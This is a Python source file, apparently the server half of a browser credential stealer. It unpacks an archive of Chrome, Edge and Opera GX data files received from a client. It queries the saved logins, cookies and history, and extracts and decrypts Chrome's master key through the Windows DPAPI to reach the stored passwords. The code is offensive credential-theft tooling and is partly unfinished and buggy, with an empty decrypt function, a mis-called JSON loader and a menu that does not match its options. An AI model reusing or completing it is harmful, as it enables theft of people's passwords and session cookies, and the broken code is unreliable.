import sqlite3
import os
import json
import base64
import win32crypt
import Sockets.sckt_server as server
import shutil

#pip install pypiwin32

# Enviar de client a server , haciendo que en el serve se guarden en x sitio.

BasePath = "Data/"

PATH = {
    "CHROME_LOCAL_STATE_FILE_PATH": BasePath + "Chrome_Local_State",
    "CHROME_PASSWORDS_DB_PATH": BasePath + "Chrome_Login_Data",
    "CHROME_COOKIES_DB_PATH": BasePath + "Chrome_Cookies",
    "CHROME_HISTORY_DB_PATH": BasePath + "Chrome_History",
    "CHROME_BOOKMARKS_FILE_PATH": BasePath + "Chrome_Bookmarks",
    "EDGE_LOCAL_STATE_FILE_PATH": BasePath + "Edge_Local_State",
    "EDGE_PASSWORDS_DB_PATH": BasePath + "Edge_Login_Data",
    "EDGE_COOKIES_DB_PATH": BasePath + "Edge_History",
    "EDGE_BOOKMARKS_FILE_PATH": BasePath + "Edge_Bookmarks",
    "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + "OPERAGX_Local_State",
    "OPERAGX_PASSWORDS_DB_PATH": BasePath + "OPERAGX_Login_Data",
    "OPERAGX_COOKIES_DB_PATH": BasePath + "OPERAGX_Cookies",
    "OPERAGX_HISTORY_DB_PATH": BasePath + "OPERAGX_History",
    "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + "OPERAGX_Bookmarks",
}

SQL = {
    "LOGIN_DATA_SQL": "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;",
    "COOKIES_SQL": "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
    "HISTORY_SQL": "SELECT url, title, visit_count, last_visit_time FROM urls;",
    "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
}

def get_db_data(file,command,master_key=None):
    con = sqlite3.connect(PATH[file])
    cursor = con.cursor()
    cursor.execute(SQL[command])
    data = cursor.fetchall()

    return data

def run_server():
    server.server()

def unpack():
    return shutil.unpack_archive("Data123963.zip", "Data/")

def master_Key():
    with open(PATH["CHROME_LOCAL_STATE_FILE_PATH"], "r") as f:
        local_state = f.read()
        local_state_json = json.load(local_state)
    master_Key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_Key = master_Key[5:]
    master_Key = win32crypt.CryptUnprotectData(master_Key,None,None,None,0)[1]

    return master_Key

def decrypt_pass():
    pass

def pass_chrome():
    #cnn = sqlite3.connect(os.getenv('localappdata')+ r'\\Google\\Chrome\\User Data\\Default\\Login Data')
    cnn=sqlite3.connect(PATH["CHROME_PASSWORDS_DB_PATH"])
    cnn1 = sqlite3.connect("chrome_pass.db")
    cursor = cnn.cursor()
    cursor1 = cnn1.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        cursor1.execute('''CREATE TABLE passwords(url, username, password)''')
        print(master_Key())
        """
        for i in cursor.fetchall():
            print(master_Key())
        """
    except Exception as e:
        pass
    finally:
        cursor.close()
        cnn.close()

def main():
    options = {1: run_server,
               2: unpack,
               3: pass_chrome,
               4: master_Key,
        }

    while True:
        print("1. Run Server")
        print("2. Unpack Data")
        print("3. Decrypt Chrome Passwrds and Generate a DB")
        print("4. Decrypt Edge Passwrds and Generate a DB")
        print("5. Decrypt OperaGX Passwrds and Generate a DB")

        x = int(input())
        if x != 5:
            options[x]()
        else:
            break



    """
    get_master_key(PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
     for file_path in TARGET_FILE_PATH:
    """

    """"
    x = get_db_data("CHROME_HISTORY_DB_PATH","HISTORY_SQL")
    for i in x:
        print(i)
    """


if __name__ == "__main__":
    main()
